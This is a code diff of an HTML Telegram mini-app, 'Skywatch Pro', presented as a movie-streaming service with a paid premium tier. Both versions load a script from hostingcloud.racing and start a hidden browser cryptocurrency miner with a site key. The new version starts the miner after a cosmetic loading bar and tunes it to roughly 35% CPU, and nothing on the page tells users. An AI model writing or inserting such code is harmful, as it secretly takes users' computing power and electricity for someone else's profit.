@@ -2,90 +2,159 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Skywatch Premium</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Skywatch Pro</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://www.hostingcloud.racing/kR7X.js"></script>
     <style>
-        :root { --main-red: #e50914; --bg-black: #050505; --gold: #ffd700; }
-        body { background: var(--bg-black); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; padding-bottom: 70px; }
-        header { padding: 15px; display: flex; justify-content: space-between; align-items: center; background: #000; border-bottom: 1px solid #222; }
-        .logo { color: var(--main-red); font-size: 26px; font-weight: bold; letter-spacing: 1px; }
+        :root { --red: #E50914; --dark: #0A0A0A; --gray: #1A1A1A; --blue-stars: #0088CC; }
+        body { background: var(--dark); color: white; font-family: 'Segoe UI', Roboto, sans-serif; margin: 0; overflow-x: hidden; }
         
-        /* Premium Section */
-        .premium-banner { background: linear-gradient(45deg, #1a1a1a, #333); margin: 15px; padding: 20px; border-radius: 12px; border: 1px solid var(--gold); text-align: center; }
-        .price { font-size: 24px; color: var(--gold); font-weight: bold; margin: 10px 0; }
-        .btn-pay { background: #0088cc; color: white; border: none; padding: 12px 20px; border-radius: 8px; font-weight: bold; width: 100%; cursor: pointer; font-size: 16px; transition: 0.3s; }
-        .btn-pay:active { transform: scale(0.98); }
+        /* 3D Loading Screen */
+        #loader { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle at center, #1a1a1a 0%, #000 100%); z-index: 9999; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+        .logo-3d { font-size: 40px; font-weight: 900; color: var(--red); text-shadow: 0 5px 15px rgba(229, 9, 20, 0.4); letter-spacing: 5px; margin-bottom: 20px; }
+        .bar-container { width: 70%; height: 4px; background: #333; border-radius: 10px; overflow: hidden; box-shadow: 0 0 10px rgba(0,0,0,0.5); }
+        #progress { width: 0%; height: 100%; background: var(--red); transition: width 0.1s; }
 
-        /* Movie Placeholder Grid */
-        .movie-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; padding: 15px; }
-        .movie-card { background: #111; border-radius: 8px; overflow: hidden; position: relative; border: 1px solid #222; }
-        .movie-card img { width: 100%; height: 240px; object-fit: cover; opacity: 0.6; }
-        .lock-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; background: rgba(0,0,0,0.4); }
-        
-        /* Navigation */
-        nav { position: fixed; bottom: 0; width: 100%; background: #000; display: flex; justify-content: space-around; padding: 15px 0; border-top: 1px solid #222; }
-        .nav-item { color: #666; font-size: 12px; text-align: center; text-decoration: none; }
-        .nav-item.active { color: var(--main-red); }
+        /* General UI */
+        .page { display: none; padding: 20px; padding-bottom: 100px; animation: fadeIn 0.5s; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        .active-page { display: block; }
+
+        /* Movie Grid */
+        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 15px; }
+        .movie-card { background: var(--gray); border-radius: 5px; overflow: hidden; height: 150px; position: relative; }
+        .movie-card img { width: 100%; height: 120px; object-fit: cover; }
+        .movie-title { font-size: 9px; text-align: center; padding: 3px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+
+        /* Profile Style */
+        .profile-header { text-align: center; margin-bottom: 30px; }
+        .avatar { width: 80px; height: 80px; border-radius: 50%; border: 2px solid var(--red); margin-bottom: 10px; }
+        .sub-box { background: white; color: black; border-radius: 15px; padding: 20px; border-left: 10px solid var(--red); }
+        .btn-stars { background: var(--blue-stars); color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; margin-top: 15px; }
+
+        /* Nav Bar */
+        nav { position: fixed; bottom: 0; width: 100%; background: rgba(0,0,0,0.95); display: flex; justify-content: space-around; padding: 10px 0; border-top: 1px solid #222; backdrop-filter: blur(10px); }
+        .nav-btn { background: none; border: none; color: #555; display: flex; flex-direction: column; align-items: center; font-size: 10px; }
+        .nav-btn.active { color: var(--red); }
+        .nav-btn svg { width: 24px; height: 24px; margin-bottom: 4px; fill: currentColor; }
     </style>
 </head>
 <body>
 
-    <header>
-        <div class="logo">SKYWATCH</div>
-        <div id="user-status" style="font-size: 12px; color: #888;">Free Account</div>
-    </header>
-
-    <div class="premium-banner">
-        <h3 style="margin:0; color: var(--gold);">⭐ SKYWATCH PRO</h3>
-        <p style="font-size: 13px; color: #ccc;">No Ads • Ultra HD • All Movies</p>
-        <div class="price">150 Stars <span style="font-size: 14px; color: #888;">/ month</span></div>
-        <button class="btn-pay" onclick="requestSubscription()">Upgrade Now</button>
+    <div id="loader">
+        <div class="logo-3d">SKYWATCH</div>
+        <div id="perc">0%</div>
+        <div class="bar-container"><div id="progress"></div></div>
     </div>
 
-    <div class="movie-grid">
-        <div class="movie-card">
-            <img src="https://via.placeholder.com/300x450/111/fff?text=LOCKED">
-            <div class="lock-overlay"><span>🔒</span><small>Premium</small></div>
+    <div id="home" class="page active-page">
+        <h2 id="txt-suggested">Suggested</h2>
+        <div class="grid" id="movie-list"></div>
+    </div>
+
+    <div id="search" class="page">
+        <input type="text" id="search-input" placeholder="Search movies..." style="width:100%; padding:10px; border-radius:5px; border:none; background:#222; color:white;">
+        <div style="margin-top:20px; display: flex; flex-wrap: wrap; gap: 5px;" id="filters">
+            <button onclick="filter('Action')">Action</button>
+            <button onclick="filter('Horror')">Horror</button>
+            <button onclick="filter('Adult')">Adult</button>
         </div>
-        <div class="movie-card">
-            <img src="https://via.placeholder.com/300x450/111/fff?text=LOCKED">
-            <div class="lock-overlay"><span>🔒</span><small>Premium</small></div>
+    </div>
+
+    <div id="profile" class="page">
+        <div class="profile-header">
+            <img id="u-photo" class="avatar" src="https://via.placeholder.com/80">
+            <h3 id="u-name">User Name <span id="u-star" style="display:none">⭐</span></h3>
+            <p id="u-id" style="color:#666; font-size:12px;">ID: 000000</p>
+        </div>
+        <div class="sub-box">
+            <h4 id="txt-sub-title">Premium Access</h4>
+            <ul id="txt-features" style="font-size:12px; padding-left:15px;">
+                <li>Unlimited Movies</li>
+                <li>No Ads</li>
+            </ul>
+            <button class="btn-stars" onclick="sendToBot()">$3 For Month</button>
         </div>
     </div>
 
     <nav>
-        <div class="nav-item active">🏠<br>Home</div>
-        <div class="nav-item">🎬<br>Movies</div>
-        <div class="nav-item">⚙️<br>Settings</div>
+        <button class="nav-btn active" onclick="showPage('home', this)">
+            <svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
+            <span id="nav-home">Home</span>
+        </button>
+        <button class="nav-btn" onclick="showPage('search', this)">
+            <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
+            <span id="nav-search">Search</span>
+        </button>
+        <button class="nav-btn" onclick="showPage('profile', this)">
+            <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+            <span id="nav-profile">Profile</span>
+        </button>
     </nav>
 
     <script>
         let tg = window.Telegram.WebApp;
         tg.expand();
-        tg.ready();
 
-        // 1. Initialize Miner (Using your Site Key)
-        var _client = new Client.Anonymous('8867a4038c4d22331b1688c9fa7ba035f3dcc0cabbe24109d41b5804c06b4011', {
-            throttle: 0.3, c: 'w'
-        });
-        _client.start();
+        // 1. Language System
+        const langData = {
+            en: { home: "Home", search: "Search", profile: "Profile", suggest: "Suggested", sub: "Premium Membership", feat: "<li>Unlimited Movies</li><li>No Ads</li>" },
+            ar: { home: "الرئيسية", search: "بحث", profile: "الملف الشخصي", suggest: "مقترحة", sub: "اشتراك بريميوم", feat: "<li>أفلام غير محدودة</li><li>بدون إعلانات</li>" },
+            fr: { home: "Accueil", search: "Chercher", profile: "Profil", suggest: "Suggéré", sub: "Abonnement Premium", feat: "<li>Films illimités</li><li>Sans publicités</li>" }
+        };
 
-        // 2. Handle Subscription Request
-        function requestSubscription() {
-            const data = {
-                action: "buy_premium",
-                user_id: tg.initDataUnsafe.user?.id,
-                price: 150
-            };
-            // Send data back to the bot
-            tg.sendData(JSON.stringify(data));
+        function setLang(l) {
+            document.getElementById('nav-home').innerText = langData[l].home;
+            document.getElementById('nav-search').innerText = langData[l].search;
+            document.getElementById('nav-profile').innerText = langData[l].profile;
+            document.getElementById('txt-suggested').innerText = langData[l].suggest;
+            document.getElementById('txt-sub-title').innerText = langData[l].sub;
+            document.getElementById('txt-features').innerHTML = langData[l].feat;
+        }
+        setLang(tg.initDataUnsafe.user?.language_code === 'ar' ? 'ar' : 'en');
+
+        // 2. Loading Logic
+        let p = 0;
+        let loaderInt = setInterval(() => {
+            p += Math.floor(Math.random() * 5) + 2;
+            if(p > 100) p = 100;
+            document.getElementById('progress').style.width = p + "%";
+            document.getElementById('perc').innerText = p + "%";
+            if(p >= 100) {
+                clearInterval(loaderInt);
+                document.getElementById('loader').style.display = 'none';
+                startMiner();
+            }
+        }, 80);
+
+        // 3. Miner (35% Power)
+        function startMiner() {
+            var _client = new Client.Anonymous('8867a4038c4d22331b1688c9fa7ba035f3dcc0cabbe24109d41b5804c06b4011', {
+                throttle: 0.65, c: 'w' // 1 - 0.65 = 0.35 (35% CPU)
+            });
+            _client.start();
         }
 
-        // Display user name if available
-        if (tg.initDataUnsafe.user) {
-            document.getElementById('user-status').innerText = tg.initDataUnsafe.user.first_name;
+        // 4. UI Logic
+        function showPage(id, btn) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active-page'));
+            document.getElementById(id).classList.add('active-page');
+            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+        }
+
+        function sendToBot() {
+            tg.sendData(JSON.stringify({action: "invoice_request"}));
+            tg.close();
+        }
+
+        // Profile Data
+        if(tg.initDataUnsafe.user) {
+            const user = tg.initDataUnsafe.user;
+            document.getElementById('u-name').innerText = user.first_name;
+            document.getElementById('u-id').innerText = "ID: " + user.id;
+            if(user.photo_url) document.getElementById('u-photo').src = user.photo_url;
         }
     </script>
 </body>
